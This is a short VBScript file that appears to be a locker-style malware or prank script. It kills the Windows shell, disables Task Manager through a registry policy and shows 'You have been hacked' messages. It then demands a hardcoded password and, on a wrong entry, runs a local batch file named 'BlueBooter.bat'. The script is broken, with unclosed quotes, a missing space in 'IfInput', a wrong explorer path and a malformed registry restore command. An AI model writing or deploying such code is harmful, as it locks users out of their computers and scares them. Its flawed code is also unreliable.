set cmd=CreateObject("wscript.shell")
Dim Input
pass = "111716"

cmd.run "taskkill /f /im explorer.exe"
cmd.run "reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f"
X=MsgBox("You have been hacked.,0+16,"HACKER")
Input=InputBox("YOUR PC IS NOW DEAD.")
IfInput= pass Then
X=MsgBox("CORRECT,0+64,"HACKER")
cmd.run "C:\WindowsExplorer.exe"
cmd.run "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /"
Else
X=MsgBox("INCORRECT! YOUR PC HAS BEEN INFECTED,0+16,"YOU GOT HACKED")
cmd.run"C:\Users\bitcoin\Desktop\Virus\BlueBooter.bat"
End If
